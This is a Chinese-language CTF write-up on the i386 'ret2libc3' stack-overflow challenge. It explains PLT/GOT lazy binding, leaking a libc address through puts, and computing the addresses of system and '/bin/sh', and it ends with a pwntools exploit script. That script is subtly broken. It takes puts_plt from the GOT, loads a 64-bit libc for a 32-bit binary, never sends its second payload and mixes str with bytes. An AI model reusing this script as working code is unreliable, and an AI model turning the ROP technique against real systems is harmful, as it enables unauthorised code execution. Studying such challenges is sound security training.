TITLE CTF那些事儿-Pwn-进入Pwn的世界-动态链接动态系统调用-ret2libc3

DATE 2026-07-05

SUMMARY 有关动态链接动态系统调用的相关真题演练与详细解析

TAG 栈溢出, ret2syscall


# 这个也是一个很大挑战哇

> [!TIP]
> 一样的，还是只是开启了NX保护
> 但是可以发现，如果还是按照之前那个进行系统调用的话，发现没有对应的gadget可以用
> ![[Pasted image 20260117153607.png]]

> [!CAUTION]
> 值得注意的是，这里的IDA可以发现没有很多的内部函数，也就是类似__func这种的名称的函数，所以我们可以判断上一个题目是静态编译而这次是动态编译
> ![[Pasted image 20260117153637.png]]


> [!TIP]
> 这里补充一些关键新知识：
> 查看系统信息：lsb_release -a 或 uname -r
> 模糊过滤 和 正则过滤ls的输出：
> 	1. ls \*模糊匹配词*
> 	2. ls | grep "正则表达式"
> 
> 查看当前二进制程序运行时加载的libc：
> 	ldd ./target_binary

# （前置知识 [[#前置知识：]]）
# 让我们先根据书上的步骤来进行一个学习


## 先在setvbuf这里下一个断点
![[Pasted image 20260117163515.png]]

## 然后si单步（其实我们这里不用si）进入下一条指令，会发现PLT中的第一句代码是跳转到一个地址里面的内容，也就是跳转到0x804a01c地址里的内容，而这个地址的内容实际上是0x080483f6，而这个地址实际上是PLT中0x80483f0的下一条指令的地址，也就是说，通过一个jmp指令完成了跳转的顺序执行。
![[Pasted image 20260117163851.png]]

![[Pasted image 20260117164022.png]]


---

## 然后我们si四步，观察后续4条指令（都是截取setvbuf的）
```
0x80483f6  <setvbuf@plt+6>             push   0x20
0x80483fb  <setvbuf@plt+11>            jmp    0x80483a0
0x80483a0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4]
0x80483a6                              jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+8] <_dl_runtime_resolve>
```


[[#这里要注意一下s和si的区别]]
先逐步拆解一下输出：   **总结：** [[#^1200]]
1. 首先第一条指令，`0x20` 这个参数在源码中叫做 reloc_offset，是每个函数的**下标**，不同函数拥有不同的reloc_offset。这里的setvbuf函数打下标是0x20
2. 0x80483a0是PLT\[0]的位置，PLT的第一个元素    [[#针对第二个输出的解析]]
3. 之后进入了 \_dl_runtime_resolve 进行解析。
   这个函数运行完毕后，可以看到setvbuf函数的 GOT 中已经保存了 setvbuf 函数在内存中的实际地址（而非初始值的 **0x080483f6**）
   **实际上，执行完dl runtime函数后会立即进入到 setvbuf 函数执行**

---
- \_dl_runtime_resolve 函数的执行可分为 3 个步骤：  ^1200
	1. 解析对应函数的地址
	2. 将解析出来的地址写入对应的 GOT 中
	3. 跳转到解析出来的函数地址执行


---
在setvbuf的GOT中，可以看到 GOT 中的地址已经变为函数在内存中的实际地址

在第二次调用setvbuf函数的时候，因为GOT中保存的是setvbuf函数在内存中的实际地址，所以会直接进入setvbuf函数中运行

---
## 总结：
- 当一个函数被调用过一次后，GOT 就会存储其在内存中的实际地址。
- **比如**，调用过setvbuf函数后，setvbuf函数的 GOT 就会存储 setvbuf函数在内存中的实际地址。
- 由于每个外部链接库的地址在内存中是紧邻的，比如在下图中，/lib/i386-linux-gnu/libc-2.23.so这个外部链接库的地址从0xf7e02000开始，到0xf7fb6000结束，中间没有空闲地址。
- 也就是说，函数的地址虽然是随机的，但是任意两个函数地址的偏移是固定的，是从二进制文件libc-2.23.so读取的两个函数地址的偏移。


### 那这能说明什么呢？
- 由于printf函数和system函数之间的地址偏移是固定的，也就是说，可以通过读取libc.so这个二进制文件，先计算出printf函数和system函数之间的地址偏移，就能计算出system函数的地址。
- `printf_addr - system_addr = libc.symbols['printf'] - libc.symbols['system']`
- 这里的 printf 函数不是绝对的，实际上，libc.so中任意一个函数地址均可。
- 可以通过调用某个函数来泄露函数的地址，比如puts(gets_got)，就可以通过puts函数将gets函数的GOT内容打印出来
- 这样就能够泄露一个libc.so中的函数在内存中的实际地址




### 针对第二个输出的解析
![[Pasted image 20260117165650.png]]
首先，第一个语句前面的 `x80483a0   push   dword ptr [_GLOBAL_OFFSET_TABLE_+4]` （这个在gdb中看）中的GLOBAL 是 GOT 的初始位置，也就是 `0x804a000`，这里 +4 也就是 push GOT 中的第二个元素，也可以叫做 **GOT\[1]**， 这里保存的内容是**link_map** [[#^795db6]] 。

第二个语句，`0x80483a6  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+8] <_dl_runtime_resolve>`, 是GOT的第三个元素，也可以叫作 GOT\[2]，保存了_dl_runtime_resolve函数的地址[[#^555]]



---
#### link_map
^795db6
- 存储了解析每个函数的地址的关键数据

#### \_dl_runtime_resolve
^555
- 是一个解析函数，用来解析每个外部函数的地址，它需要两个参数：link_map 和 reloc_offset，这个函数就是一段汇编代码，真正的核心函数是
  **\_dl_fixup(struct link_map \*l, ElfW(Word) reloc_offset)**，这也是一个解析函数

---

## 这里要注意一下s和si的区别
> [!CAUTION]
>**s（step）**  
 >单步执行，**进入**函数内部（会跳进 `call` 调用的函数）。
>**si（step instruction）**  
>单步执行**一条汇编指令**，会进入 `call` 对应的函数机器码。
>**区别**：  
>- 源码级调试用 `s`（跟进函数）。  
>- 汇编级调试用 `si`（精确跟踪每行汇编，包括 `call` 内部的 prologue）。  
>- 若当前指令是 `call`，`s` 会进入该函数的源码开头；`si` 会进入该函数的第一条汇编指令。
>
> **对应不进入的版本**：  
>- `n`（next） → 源码级单步，**跳过**函数。  
>- `ni`（next instruction） → 汇编级单步，**跳过** `call`（直接执行完整个函数）。






# 前置知识：
## GOT：
- 全局偏移量表（Global Offset Table），用于存储外部函数在内存中的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行过程中被修改。

## PLT：
- 程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之，程序回到PLT中寻找外部函数的地址。PLT存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改。

## 简单来说：
- GOT 是个数据表，存储的是外部函数的地址，具有读写权限（在FULL RELRO保护机制开启时，没有读写权限）
- PLT 是外部函数的入口表，存储的是每个外部函数的代码，具有执行权限

**ELF.got**  
- 全称：Global Offset Table（全局偏移表）  
- **用途**：存储**已解析**的全局函数/变量的实际地址（运行时填充）。  
- **特点**：可读写，存放动态链接后函数的真实地址（如 `printf` 在 libc 中的地址）。  
- **攻击相关**：修改 GOT 表项可劫持函数调用（GOT 劫持）。

**ELF.plt**  
- 全称：Procedure Linkage Table（过程链接表）  
- **用途**：在**首次调用函数**时跳转到动态链接器解析地址，后续直接跳转到 GOT 中保存的地址。  
- **特点**：只读，包含一段跳转代码（`jmp *GOT[n]`）。  
- **攻击相关**：通常不可写，但可通过劫持 GOT 或利用 PLT 触发解析过程（如 ret2dlresolve）。

**简记**：
- **.plt** 是“跳转代码”，**.got** 是“地址表”。  
- 函数第一次调用：`call printf@plt` → `plt` 跳转到 `got`（未解析）→ 触发动态链接器填充 `got` 表项 → 后续调用直接通过 `got` 跳转到真实函数。  

**Pwn 中用途**：
- 泄漏 `.got` 中已解析的 libc 地址 → 计算 libc 基址。  
- 覆盖 `.got` 表项（如 `puts` 的 GOT）→ 控制程序流（需可写权限）。


**u32() 作用**  
将 4 字节数据打包/解包为**无符号 32 位整数**（小端序，除非指定 `endian='big'`）。  

- `p32()`：将整数打包为 4 字节字符串（Python 2/3 中 bytes）。  
- `u32()`：将 4 字节字符串解包为整数。  

例（pwn 中常见）：
```python
from pwn import *
addr = u32(p.recv(4))       # 接收4字节，转成整数
payload = p32(0x8048000)    # 整数转4字节小端序
```

---

**symbols**  
是 ELF 对象（`ELF("binary")`）的属性，返回**符号表字典**，键为符号名，值为符号地址。  

例：
```python
from pwn import *
e = ELF("./demo")
print(hex(e.symbols["main"]))    # main 函数地址
print(hex(e.symbols["puts"]))    # puts 的 PLT 地址（如果未剥离）
```

**用途**：
- 获取函数/全局变量的地址（如 `main`、`__libc_start_main`）。
- 构建 payload 时直接用符号名而非硬编码地址。

**注意**：若二进制剥离（stripped），部分符号可能不存在。


# exp

```python
from pwn import *

context(arch='i386', os='linux')

elf = ELF("./ret2libc3")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process('ret2libc3')
# gdb.attach(p, 'b *0x08048544')

gets_got = elf.got['gets']
puts_plt = elf.got['puts']

main_addr = 0x0804854E

p.recvuntil(b'ret2libc3\n')

payload1 = b'A' * 0x108 + p32(0)
payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)

p.sendline(payload1)

leak_addr = u32(p.recv(4))
libc_base = leak_addr - libc.symbols['gets']
libc.address = libc_base

log.success("libc_base: "+hex(libc.address))

system = libc.symbols['system']
binsh = next(libc.search("/bin/sh"))

p.recvuntil("ret2libc3\n")

payload2 = b"A" * 0x108 + "junk"
payload2 += p32(system) + "junk" + p32(binsh)

p.interactive()

```


# exp疑惑点讲解

## 第一段payload那里：
- puts_plt 覆盖正常返回地址，用于执行（plt），gets_got是gets的got地址，作为puts的参数以供打印出来。main地址是作为puts_plt的返回地址，用于puts函数执行完后跳回main函数重新执行。
- 因为 `gets_got` 中存放的是 `gets` 函数在 libc 中的实际地址，打印出来即可**泄露 libc 基址**。

---
## libc_base 的计算过程
**为什么可行**：

- 动态链接时，GOT 表会被填入**真实 libc 中的函数地址**。
  
- 不同进程的 libc 加载地址不同（ASLR），但**函数在 libc 内部的偏移是固定的**（libc 版本确定）。
  
- 所以用泄露的地址减去 libc 文件中该函数的偏移，就得到 libc 的**实际加载基址**。

**GOT 本身是一个地址表，表中存储的是确切的内存地址。**

**分两层理解**：

1. **GOT 表项的地址（偏移）**  
   例如 `elf.got['gets']` 返回 `0x804a010`，这是 **GOT 表中 gets 条目在二进制文件中的固定位置**（相对于二进制基址的偏移），在编译后确定。

2. **GOT 表项存储的内容（确切地址）**  
   在程序运行时，动态链接器会将 `gets` 函数在内存中的**实际加载地址**（如 `0xf7e12380`）写入到 `0x804a010` 这个内存位置。

**所以**：
- **`elf.got['gets']`** 是 `gets` 在 GOT 表中的**条目位置**（固定偏移）。
- **`puts(elf.got['gets'])`** 打印的是该条目中存储的**内容**，即 `gets` 在运行时的真实内存地址。

**类比**：
- GOT 表像一张通讯录，`elf.got['gets']` 是第 5 行（固定行号）。
- 程序运行时，在第 5 行写上 `gets` 的实际电话号码（运行时地址）。
- 你要泄露的是“电话号码”，而不是“第5行”这个行号。

---
# 为什么不能用int解码：

- 网络传输/内存泄露通常用**原始字节**，需按架构端序解包。
  
- `u32()` 自动处理小端序解包，而 `int()` 需要先手动将字节转为十六进制字符串（`bytes_data.hex()`），但**仍需注意端序**。

# 这里有个有意思的细节：
- 如果把recv(4)注释掉，再打印recvuntil的内容，会发现结果为：b'p\xa6\xd2\xf7\xa0\xb2\xd2\xf7\nret2libc3\n'
  超过了 4 个小端序字节。
- 这是因为`puts` 打印地址时**没有 null 终止**，而是一直打印到遇到内存中的 `\x00` 为止，结果把 **GOT 表中 `gets` 后面相邻的条目内容也一起输出**了。
- 这也是为什么要recv(4)的原因了，因为只需要前面的gets的got